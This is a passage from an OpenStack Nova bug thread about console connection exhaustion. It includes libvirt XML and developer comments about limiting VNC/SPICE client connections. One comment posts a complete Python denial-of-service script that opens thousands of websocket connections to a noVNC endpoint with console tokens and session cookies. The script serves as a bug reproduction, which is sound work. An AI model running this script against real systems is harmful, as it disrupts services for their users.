file=\"/var/nova/instances/5e5fa2d6-bc4e-4b6e-9d4c-73aaddf51380/disk\"/>\n      <target bus=\"virtio\" dev=\"vda\"/>\n    </disk>\n    <disk type=\"file\" device=\"cdrom\">\n      <driver name=\"qemu\" type=\"raw\" cache=\"none\"/>\n      <source file=\"/var/nova/instances/5e5fa2d6-bc4e-4b6e-9d4c-73aaddf51380/disk.config\"/>\n      <target bus=\"ide\" dev=\"hdd\"/>\n    </disk>\n    <interface type=\"bridge\">\n      <mac address=\"fa:16:3e:ed:b6:7a\"/>\n      <model type=\"virtio\"/>\n      <source bridge=\"ovsbridge0\"/>\n      <virtualport type=\"openvswitch\">\n        <parameters interfaceid=\"9fbfb0c8-edba-484e-9dcd-d34dfea2e239\"/>\n      </virtualport>\n    </interface>\n    <serial type=\"file\">\n      <source path=\"/var/nova/instances/5e5fa2d6-bc4e-4b6e-9d4c-73aaddf51380/console.log\"/>\n    </serial>\n    <console type=\"unix\">\n      <source mode=\"bind\" path=\"/etc/nova/consoles/5e5fa2d6-bc4e-4b6e-9d4c-73aaddf51380.console\"/>\n      <target type=\"serial\" port=\"1\"/>\n    </console>\n    <channel type=\"pty\">\n      <target type=\"virtio\" name=\"com.redhat.spice.0\"/>\n    </channel>\n    <graphics type=\"vnc\" autoport=\"yes\" keymap=\"en-us\" listen=\"127.0.0.1\"/>\n    <graphics type=\"spice\" autoport=\"yes\" keymap=\"en-us\" listen=\"0.0.0.0\"/>\n  </devices>\n</domain>\n", 
            "date_created": "2014-03-13 20:03:05.613005+00:00", 
            "author": "https://api.launchpad.net/1.0/~meghalgosalia"
        }, 
        {
            "content": "In my dev environment, by default 'console' element is present in the libvirt.xml. So I can verify it right now.\n\nBut as per libvirt document here http://libvirt.org/formatdomain.html#elementsConsole\nit says\n\"If the console is presented as a serial port, the target element has the same attributes as for a serial port. There is usually only 1 console.\" This could be one reason why libvirt is disconnecting previously opened client connections.", 
            "date_created": "2014-03-13 20:23:11.588833+00:00", 
            "author": "https://api.launchpad.net/1.0/~tpatil"
        }, 
        {
            "content": "In my previous comment, I meant to say the console element is not present in the libvirt.xml of the instance. So I couldn't verify your scenario.", 
            "date_created": "2014-03-13 21:08:14.447732+00:00", 
            "author": "https://api.launchpad.net/1.0/~tpatil"
        }, 
        {
            "content": "I think it will be a good idea to ask Libvirt community if there's a possibility to add a new parameter to put restriction on the number of client connections one can open based on the type of the graphics (vnc/spice).  since graphic type 'vnc' already has implemented sharedPolicy, it must be aware of the client connections, so adding logic to check the number of opened client connection should be a easy fix I guess.\n\nWhat do you guys think?", 
            "date_created": "2014-03-13 21:17:33.152601+00:00", 
            "author": "https://api.launchpad.net/1.0/~tpatil"
        }, 
        {
            "content": "Tushar: Thanks for your response.\n\nI also believe, having a control at driver side would be a better approach to handle this scenario.", 
            "date_created": "2014-03-13 21:22:11.648497+00:00", 
            "author": "https://api.launchpad.net/1.0/~meghalgosalia"
        }, 
        {
            "content": "https://review.openstack.org/#/c/57224/ has been abandoned since December, so moving the Nova task back to Triaged and removing the assignee", 
            "date_created": "2014-03-31 10:52:12.020766+00:00", 
            "author": "https://api.launchpad.net/1.0/~markmc"
        }, 
        {
            "content": "the very beginning dos script seems to lose its effect within my icehouse distribution.\nHere's a new one FYI.\n\nfrom websocket import create_connection\nimport socket\nfrom websocket._abnf import *\n                                                                                   \n# get the below token from nova get-vnc-console <server_uuid> novnc\ncookie = \"token=1ee0401e-2703-472f-a1e8-808797b098be\" + \"; \" +\\\n    \"splunkweb_csrf_token_8000=6291176153857905334\" + \"; \" +\\\n    \"horizon.tabs=%7B%22instance_details%22%3A%22%23instance_details__overview%22%7D\" + \"; \" +\\\n    \"csrftoken=TNZO7K4Inxc4SGfo0WRryYzxoXsD0dXU\" + \"; \" +\\\n    \"sessionid=\\\".eJytVVtz3DQUTrdJNt2QhN5oy6UJt7IBuivJsmV3hhdgeACmzGSqGb9kdmTpODbxyqu1vJAHz8ALP4W_xV9B9m4CBZLAlCdbR0fnnO87R59-6jXmxpDv1rqS5QzUxJanoPlBSmiEoshLUuYHEWAsiCCBZBJ74CNGeL-uYD7JVXywtrYW0hCnEHjEIwENmUoYAg-FAhBDiKLU9Pj2HE7yUk-0mALf_RJSURf24Kgz8p2JqG02WYXMenxv5Q1azcpc2_ixy5JZO3s2HhdnT2Wp7bwsCpg_8xFC4wUZIXOT77nzi1xCNVkej2-5U8vf7zSYdX7nT3kSIR1SxZ842LqybtVtjlb20TdwVtlSw-crv51CVHYipM0XuT37ev-rX1_wjY4t-ZcIbfjBi3ZnYDYOfzabjekP-aYqpyLXZqsxt4a8lyszeM7XWzrM9vOa765q_0JYUZQn5rVjszNszO4w3nMgznmoJkWuTyuzd9xhuzCb14_N7cbcGcZbzizUNNf86FtzN_7sMt5CxoLxAo9BSIFFShKWMCpVKlIMAZYoxCpQxPfjzQsOzb1svUs7q5Mil22C-_9Dgp6L4Nh4o5skCoqKBPu-F3gUkyj0Il9AhFmIBRVKxNutt7Yw16JoK3jw6hXUIl53MezZDMzDDu-iLOopdNauQY86q8y1gnndmDeH2d5x5ih_qzFvD7O78aPLSohIRLJ7L89hdv8a_yUTREQSUkm8JElogmmCwsRjkiZSIZRGUfbg6jC1yB7GGy1bU3EC2RLCSSG0BAfhnXMIjxuz30K4ikXqLti1LP4DzFePuaQiwBgkC1iSppiCh8OIeiCw73lICT8KsquH4F-l6ujqt10up7PatoR17S8XwtF1cE7Xu4157-qOB66e_9Lx1n81-yIABysRLBA0BJIoX1Gc0lDJFAV-eGXHXZgLCBrsD-X81EFYrmrnpR2K989RfNCYD1sU-5eF83zPZ52s_h1LdvNiQttbiUSaUr-lNHHdkYRA5PsBSIpcvdfLdlf0VicBoK1TVld1uzxdyW8NfMOdgco8OTYfOUUcrhwmU5gmTserxhw608a57lXueekEfqm37j0xH_O-Wj445hPehx9n-dzF-1QqYcHmUxhc_JinfND_7UZv67bXXfiqDAOER6vvgFs5MKPDIzP-5cgg3p_Ny-9BWoMbQ4bZoGPlukEzXrb9R7WG1ny9Ldf4jQlcjKz30jaru6ci5AdAGEsjoXCSuqEIIsl8jEIvJaEMnGAyvmlBC21NlJE6qUe_A_xhWBw:1Y6wUZ:VnAb0AP64d0OvuJ_cZUx55x4xeI\"\n\ns = \"Pragma: no-cache\\r\\n\"\ns += \"Cache-Control: no-cache\\r\\n\"\ns += \"User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36\\r\\n\"\ns += \"Accept-Encoding: gzip, deflate, sdch\\r\\n\"\ns += \"Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,ja;q=0.2,zh-TW;q=0.2\\r\\n\"\ns += \"Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\"\n                                                                                   \nconnection_container = []                                                          \nfor i in range(1, 10000):\n    try:                                                                           \n        print \"Creating Connection\"\n        ws = create_connection(\"ws://ly-controller:6080/websockify\", 20, header={s}, cookie=cookie, subprotocols={\"binary\", \"base64\"})\n        print \"Receiving...\"\n        frame = ABNF.create_frame(\"RFB 003.008\\n\", ABNF.OPCODE_BINARY)\n        frame.mask = 0\n        ws.send_frame(frame)\n        result = ws.recv()\n        print \"Received '%s'\" % result\n        connection_container.append(ws)                                            \n    except socket.timeout as e:                                                    \n        print e                                                                    \n                                                                                   \nimport time                                                                        \ntime.sleep(60)\nfor connection in connection_container:                                            \n    connection.close()", 
            "date_created": "2015-01-02 14:46:17.346079+00:00", 
            "author": "https://api.launchpad.net/1.0/~hsluoyz"
        }, 
        {
            "content": "Last comment indicates that even in icehouse the dos script seemed ineffective. please flip Incomplete if anyone has some new information", 
            "date_created": "2015-03-23 11:50:06.342353+00:00", 
            "author": "https://api.launchpad.net/1.0/~dims-v"
        }, 
        {
            "content": "Cleanup\n=======\n\nThis bug report has the status \"Incomplete\" since more than 30 days\nand it looks like that there are no open reviews for it. To keep\nthe bug list sane, I close this bug with \"won't fix\". This does not\nmean that it is not a valid bug report, it's more to acknowledge that\nno progress can be expected here anymore. You are still free to push a \nnew patch for this bug. If you could reproduce it on the current master \ncode or on a maintained stable branch, please switch it to \"Confirmed\".", 
            "date_created": "2016-02-09 17:34:58.036587+00:00", 
            "author": "https://api.launchpad.net/1.0/~mzoeller"
        }
    ]
}